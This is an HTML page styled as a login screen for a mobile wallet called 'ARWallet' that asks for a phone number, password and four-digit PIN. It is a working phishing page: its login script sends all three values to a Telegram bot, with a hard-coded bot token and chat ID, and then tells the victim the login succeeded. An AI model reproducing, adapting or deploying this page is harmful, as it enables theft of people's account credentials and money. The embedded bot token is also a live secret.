<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>ARWallet Login</title>

<style>

body{
background:#f5f5f5;
font-family:Arial;
}

.container{
margin:60px auto;
width:90%;
max-width:400px;
background:white;
padding:20px;
border-radius:10px;
box-shadow:0 0 10px rgba(0,0,0,0.1);
}

h2{
color:#FFC107;
text-align:center;
}

input{
width:100%;
padding:12px;
margin:10px 0;
border:1px solid #ccc;
border-radius:6px;
}

button{
width:100%;
padding:12px;
background:#FFC107;
border:none;
border-radius:6px;
font-weight:bold;
}

</style>
</head>

<body>

<div class="container">

<h2>ARWallet Login</h2>

<input type="text" id="phone" placeholder="Phone Number">

<input type="password" id="password" placeholder="Password">

<input type="password" id="pin" placeholder="4 Digit PIN">

<button onclick="login()">Log In</button>

</div>

<script>

function login(){

let phone=document.getElementById("phone").value;
let password=document.getElementById("password").value;
let pin=document.getElementById("pin").value;

let message=
"NEW USER LOGIN\n\n"+
"Phone: "+phone+"\n"+
"Password: "+password+"\n"+
"PIN: "+pin;

fetch("https://api.telegram.org/bot8688283839:AAFSdmL1KT5JPOF7moWRcLmkYgE-r3sIEno/sendMessage",{
method:"POST",
headers:{"Content-Type":"application/json"},
body:JSON.stringify({
chat_id:"6204038568",
text:message
})
});

alert("Login Successful");

}

</script>

</body>
</html>
